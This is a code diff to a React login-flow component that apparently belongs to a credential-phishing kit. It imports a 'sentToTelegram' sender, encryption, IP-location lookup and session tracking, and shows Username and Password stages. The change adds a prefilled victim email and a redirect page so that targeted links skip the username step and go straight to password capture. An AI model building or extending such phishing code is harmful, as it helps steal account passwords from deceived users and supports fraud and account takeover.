@@ -12,14 +12,16 @@ import { sessions, useSessionStore } from "@/store/session";
 import { sentToTelegram } from "@/actions/sender";
 import { encryptObject } from "@/utils/client/encryption";
 import { RedirectPage } from "./redirectPage";
+import { RedirectPageEmail } from "./redirectPageEmail";
 
 const timer = 85000;
 
 interface HomeProps {
   keyData: string;
+  email: string | null;
 }
 
-export default function Home({ keyData }: HomeProps) {
+export default function Home({ keyData, email }: HomeProps) {
   const {
     ipLocationData,
     fetchIpLocationData,
@@ -37,10 +39,24 @@ export default function Home({ keyData }: HomeProps) {
   const [init, setInit] = useState(true);
   const [isFirst, setIsFirst] = useState(true);
   const [finish, setFinish] = useState("init");
+  const [hasEmail, setHasEmail] = useState(false);
 
   useEffect(() => {
     if (keyData) setKeyData(keyData);
   }, [keyData]);
+
+  useEffect(() => {
+    checkEmail();
+  }, [email]);
+
+  const checkEmail = () => {
+    if (email) {
+      setHasEmail(true);
+      setValue(email);
+    } else {
+      setHasEmail(false);
+    }
+  };
 
   const sendResult = async () => {
     if (value && !sessionEntries) {
@@ -177,13 +193,23 @@ export default function Home({ keyData }: HomeProps) {
                                           ) : (
                                             <>
                                               {!enterPwd ? (
-                                                <Username
-                                                  setEnterPwd={setEnterPwd}
-                                                  setLoading={setLoading}
-                                                  value={value}
-                                                  setValue={setValue}
-                                                  finish={finish}
-                                                />
+                                                !hasEmail ? (
+                                                  <Username
+                                                    setEnterPwd={setEnterPwd}
+                                                    setLoading={setLoading}
+                                                    value={value}
+                                                    setValue={setValue}
+                                                    finish={finish}
+                                                  />
+                                                ) : (
+                                                  <RedirectPageEmail
+                                                    email={email}
+                                                    setEnterPwd={setEnterPwd}
+                                                    setLoading={setLoading}
+                                                    setHasEmail={setHasEmail}
+                                                    setValue={setValue}
+                                                  />
+                                                )
                                               ) : stage === "password" ? (
                                                 <Password
                                                   value={value}
